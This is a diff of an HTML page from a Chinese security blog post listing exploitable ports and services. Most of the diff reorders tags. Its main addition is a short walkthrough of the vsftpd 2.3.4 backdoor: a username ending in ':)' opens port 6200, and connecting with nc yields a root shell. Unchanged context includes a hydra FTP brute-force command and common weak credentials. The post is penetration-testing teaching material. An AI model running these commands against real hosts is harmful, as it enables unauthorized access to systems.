@@ -16,10 +16,12 @@
 <meta property="og:site_name" content="owefsad&#39;s blog">
 <meta property="og:description" content="简介：最近遇到一个比较有意思的人, 问了我一个比较有意思的问题: 我有一个OA系统, 该如何获取系统的权限？这个问题本身并没有什么意思, 但当我告诉他扫端口,、找服务、拿权限的时候, 他问我都有哪些端口和服务可以拿权限, 忽然间我发现自己忙于学习新知识却忽略了对已学知识的总结, 以至于学习的基础端口服务漏洞、大数据组件漏洞等无法脱口而出, 很尴尬啊, 只好把我的博客扔给他让他自己去找了.本文将专门">
 <meta property="og:locale" content="default">
-<meta property="og:updated_time" content="2019-03-20T02:43:31.332Z">
+<meta property="og:image" content="http://yoursite.com/2019/03/20/port-service-vul/backdoor.png">
+<meta property="og:updated_time" content="2019-04-03T15:12:44.621Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="port_service_vul">
 <meta name="twitter:description" content="简介：最近遇到一个比较有意思的人, 问了我一个比较有意思的问题: 我有一个OA系统, 该如何获取系统的权限？这个问题本身并没有什么意思, 但当我告诉他扫端口,、找服务、拿权限的时候, 他问我都有哪些端口和服务可以拿权限, 忽然间我发现自己忙于学习新知识却忽略了对已学知识的总结, 以至于学习的基础端口服务漏洞、大数据组件漏洞等无法脱口而出, 很尴尬啊, 只好把我的博客扔给他让他自己去找了.本文将专门">
+<meta name="twitter:image" content="http://yoursite.com/2019/03/20/port-service-vul/backdoor.png">
   
     <link rel="alternative" href="/atom.xml" title="owefsad&#39;s blog" type="application/atom+xml">
   
@@ -208,7 +210,8 @@
 </ul>
 <p>2.爆破与匿名访问<br>2.1hydra爆破:<code>hydra -L /usr/share/wordlists/fasttrack.txt -P /usr/share/wordlists/fasttrack.txt -e nsr ftp://10.129.10.21</code><br>2.2常见弱密码: ftp/ftp、ftp/任意值或空密码、user/pass、anonymous/anonymous、anonymous/任意值或空密码<br>2.3匿名访问:不需要用户名密码, 可直接登陆</p>
 <p>3.嗅探<br>打开当前机器网卡的混杂模式, 抓取网络上的ftp流量, 收集其中的明文信息.</p>
-<p>4.后门<br>4.1linux vsftp 2.3.4版本存在后门: 在该版本中, 使用带有”:)”的用户名登陆目标机器时, 目标机器的6200端口启动, 可通过nc或telnet连接目标端口进行远程shell控制</p>
+<p>4.后门<br>4.1linux vsftp 2.3.4版本存在后门: 在该版本中, 使用带有”:)”的用户名登陆目标机器时, 目标机器的6200端口启动, 可通过nc或telnet连接目标端口进行远程shell控制<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 触发漏洞: ftp连接目标主机, 在用户名中输入任意字符+":)"，密码中输入任意值; 按回车之后触发</span></span><br><span class="line">ftp 172.16.88.170</span><br><span class="line">Name (172.16.88.170:root): ftp:)</span><br><span class="line">331 Please Specify the passwd.</span><br><span class="line">Password: pass</span><br><span class="line"></span><br><span class="line"><span class="comment"># 漏洞利用</span></span><br><span class="line">nc 172.16.88.170 6200</span><br><span class="line">id</span><br><span class="line">uid=0(root) git=0(root)</span><br></pre></td></tr></table></figure></p>
+<p><img src="backdoor.png" alt="backdoor"></p>
 <p>5.远程溢出漏洞<br>5.1IIS FTP 6.10.1版本存在远程溢出漏洞</p>
 <p>6.跳转攻击</p>
 <p>7.ftp后渗透<br>后渗透阶段可通过ftp下载文件、搜索敏感信息,上传木马获取shell等.</p>
@@ -468,22 +471,6 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">wordpress爆破</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">ssh爆破</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">udf提权</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">sudoers配置错误</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color2">python</a>
               </li>
              
@@ -504,11 +491,43 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">wordpress爆破</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">ssh爆破</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">udf提权</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">sudoers配置错误</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">jenkins's vul</a>
               </li>
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">crontab's vul</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">steghide</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">reverse rbash</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">sudoers</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">sysud64提权</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -532,6 +551,14 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">绕过沙箱</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">RCE</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">open ssl</a>
               </li>
              
@@ -544,15 +571,11 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">绕过沙箱</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">RCE</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color2">hexo-beauty</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">主机攻击思路</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -568,10 +591,6 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">主机攻击思路</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">metaclass</a>
               </li>
              
@@ -580,15 +599,11 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">sudoers</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">设计模式</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">单例模式</a>
+                <a href="javascript:void(0)" class="js-tag color5">工厂模式</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -600,7 +615,7 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">工厂模式</a>
+                <a href="javascript:void(0)" class="js-tag color5">单例模式</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -617,22 +632,6 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">tcpdump提权</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">hid</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">reverse rbash</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">sysud64提权</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">steghide</a>
               </li>
             
             <div class="clearfix"></div>
